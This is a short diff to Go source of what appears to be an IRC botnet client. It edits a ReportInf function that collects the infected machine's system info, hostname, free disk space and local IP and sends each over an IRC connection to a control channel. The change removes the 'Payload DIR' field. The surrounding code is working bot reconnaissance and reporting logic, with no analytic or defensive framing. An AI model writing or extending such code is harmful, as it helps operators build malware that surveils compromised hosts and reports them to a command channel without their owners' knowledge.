@@ -10,7 +10,7 @@ import (
 )
 
 type botinfo struct {
-	sys, hn, pd, fds, lip string
+	sys, hn, fds, lip string
 }
 
 func freeDiskSpace(hw string) uint64 {
@@ -43,14 +43,12 @@ func ReportInf(reportIRC net.Conn, set_chan string) {
 	nbotinfo := botinfo{
 		sys: sysInfo(),
 		hn:  hName,
-		pd:  pDir,
 		fds: fmt.Sprint(freeDiskSpace(*hw)),
 		lip: fmt.Sprint(getLocalIP()),
 	}
 
 	IRC_Report(reportIRC, set_chan, "System Info: "+nbotinfo.sys)
 	IRC_Report(reportIRC, set_chan, "Host Name: "+nbotinfo.hn)
-	IRC_Report(reportIRC, set_chan, "Payload DIR: "+nbotinfo.pd)
 	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+nbotinfo.fds)
 	IRC_Report(reportIRC, set_chan, "Local IP: "+nbotinfo.lip)
 }
